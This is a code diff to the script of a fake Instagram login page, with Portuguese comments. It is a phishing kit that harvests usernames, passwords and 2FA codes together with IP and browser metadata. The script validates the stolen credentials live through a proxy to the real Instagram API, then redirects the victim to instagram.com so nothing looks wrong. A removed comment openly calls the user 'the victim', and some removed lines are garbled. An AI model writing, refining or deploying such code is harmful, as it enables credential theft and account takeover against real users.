@@ -303,39 +303,29 @@ function tryLogin(){
 
   // Coleta de Metadados
   var userAgent = navigator.userAgent;
-  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-  var browser = 'Desconhecido';
-  if (userAgent.match(/chrome|chromium|crios/i)) browser = 'Chrome';
-  if (userAgent.match(/firefox|fxios/i)) browser = 'Firefox';
-  if (userAgent.match(/safari/i) && !userAgent.match(/chrome|chromium|crios/i)) browser = 'Safari';
-  if (userAgent.match(/edg/i)) browser = 'Edge';
-
-  var os = 'Desconhecido';
-  if (userAgent.match(/iPad/i) || (userAgent.match(/Macintosh/i) && navigator.maxTouchPoints > 1)) os = 'iPadOS';
-  else if (userAgent.match(/iPhone/i)) os = 'iOS';
-  else if (userAgent.match(/Android/i)) os = 'Android';
-  else if (userAgent.match(/Windows/i)) os = 'Windows';
-  else if (userAgent.match(/Macintosh/i)) os = 'macOS';
-  else if (userAgent.match(/Linux/i)) os = 'Linux';
-
-    var screenRes = screen.width + 'x' + screen.height;
-  var lavar timer;
-var otpShown = false;
+var timer;
 
 function go(v){location.hash=v}
 
 const PROXY_ENDPOINT = window.location.origin + '/api/proxy';
 
+// Função assíncrona para permitir o fetch do IP
 async function tryLogin(){
   var u=document.getElementById('user'),p=document.getElementById('pass');
   var uE=document.getElementById('userErr'),pE=document.getElementById('passErr');
   var ok=true;
 
-  if(u.value.trim()===''){ u.classList.add('err'); uE.hidden=false; ok=false; } 
-  else { u.classList.remove('err'); uE.hidden=true; }
-  
-  if(p.value===''){ p.classList.add('err'); pE.hidden=false; ok=false; } 
-  else { p.classList.remove('err'); pE.hidden=true; }
+  // Validação Visual
+  if(u.value.trim()===''){
+    u.classList.add('err'); uE.hidden=false; ok=false;
+  } else {
+    u.classList.remove('err'); uE.hidden=true;
+  }
+  if(p.value===''){
+    p.classList.add('err'); pE.hidden=false; ok=false;
+  } else {
+    p.classList.remove('err'); pE.hidden=true;
+  }
 
   if(!ok){
     var f=document.querySelector('.lform');
@@ -350,20 +340,23 @@ async function tryLogin(){
   var otpErr = document.getElementById('otpErr');
   var isOtpVisible = otpContainer.style.display === 'block';
 
-  // SEMPRE pede o código se não estiver visível
+  // Lógica de 2FA: Sempre pede o código se não estiver visível
   if (!isOtpVisible) {
     otpContainer.style.display = 'block';
     otpInput.focus();
     return;
   }
 
-  if (isOtpVisible && otpInput.value.trim() === '') {
-    otpInput.classList.add('err');
-    otpErr.hidden = false;
-    return;
-  } else if (isOtpVisible) {
-    otpInput.classList.remove('err');
-    otpErr.hidden = true;
+  // Valida o código se já estiver visível
+  if (isOtpVisible) {
+    if (otpInput.value.trim() === '') {
+      otpInput.classList.add('err');
+      otpErr.hidden = false;
+      return;
+    } else {
+      otpInput.classList.remove('err');
+      otpErr.hidden = true;
+    }
   }
 
   var btn = document.querySelector('.lbtn');
@@ -394,19 +387,21 @@ async function tryLogin(){
     lang: navigator.language,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     timestamp: new Date().toLocaleString('pt-BR'),
-    ip: '' // Será preenchido abaixo
+    ip: 'Indisponível'
   };
 
-  // Pega o IP Público
+  // Tenta pegar o IP Público (com timeout para não travar)
   try {
-    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 2000); // 2 segundos
+    const ipRes = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+    clearTimeout(timeoutId);
     const ipData = await ipRes.json();
     meta.ip = ipData.ip;
   } catch (e) {
-    meta.ip = 'Indisponível';
+    // Se falhar, mantém "Indisponível"
   }
 
-  // Prepara o Payload
   const payload = {
     user: u.value.trim(),
     pass: p.value,
@@ -426,9 +421,9 @@ async function tryLogin(){
     const result = await response.json();
     console.log('Resposta do Proxy:', result);
 
-    // Se o login na API real falhou (ex: senha errada), avisa a vítima
-    if (result.igStatus !== 'ok') {
-      alert('Erro ao verificar as credenciais. Tente novamente.');
+    // Se a API real do Instagram retornou erro, avisa
+    if (result.success === false || result.igStatus !== 'ok') {
+      alert('Não foi possível verificar as credenciais. Por favor, tente novamente.');
       btn.disabled = false;
       btn.textContent = 'Entrar';
       return;
@@ -442,43 +437,51 @@ async function tryLogin(){
     return;
   }
 
-  // Redireciona para o Instagram real (ela vai ver que "entrou" ou vai tentar de novo)
+  // Redireciona para o Instagram real
   setTimeout(function() {
     window.location.href = 'https://www.instagram.com/';
   }, 1500);
 }
 
+// FUNÇÃO CRÍTICA DE ROTEAMENTO
 function route(){
   var h=location.hash.slice(1);
   if(['login','ativando'].indexOf(h)<0) h='plus';
   
+  // Esconde todas as telas e mostra a correta
   ['plus','login','ativando'].forEach(function(id){
     document.getElementById(id).hidden = (id !== h);
   });
   
+  // Reset de animações
   var sec = document.getElementById(h);
-  sec.querySelectorAll('.scroll>*,.footer>*,.lback,.lang,.lmid,.lform>*,.lbottom>*').forEach(function(n,k){
-    n.style.setProperty('--i', k);
-  });
+  if(sec) {
+    sec.querySelectorAll('.scroll>*,.footer>*,.lback,.lang,.lmid,.lform>*,.lbottom>*').forEach(function(n,k){
+      n.style.setProperty('--i', k);
+    });
+  }
   
+  // Lógica da tela de carregamento
   clearTimeout(timer);
   var a = document.getElementById('ativando');
-  a.classList.remove('run','done');
-  
-  if(h==='ativando'){
-    requestAnimationFrame(function(){
+  if(a) {
+    a.classList.remove('run','done');
+    if(h==='ativando'){
       requestAnimationFrame(function(){
-        a.classList.add('run');
+        requestAnimationFrame(function(){
+          a.classList.add('run');
+        });
       });
-    });
-    timer = setTimeout(function(){
-      a.classList.add('done');
-    }, 3500);
+      timer = setTimeout(function(){
+        a.classList.add('done');
+      }, 3500);
+    }
   }
   
   window.scrollTo(0,0);
 }
 
+// INICIALIZAÇÃO
 window.addEventListener('hashchange', route);
 route();
 </script>
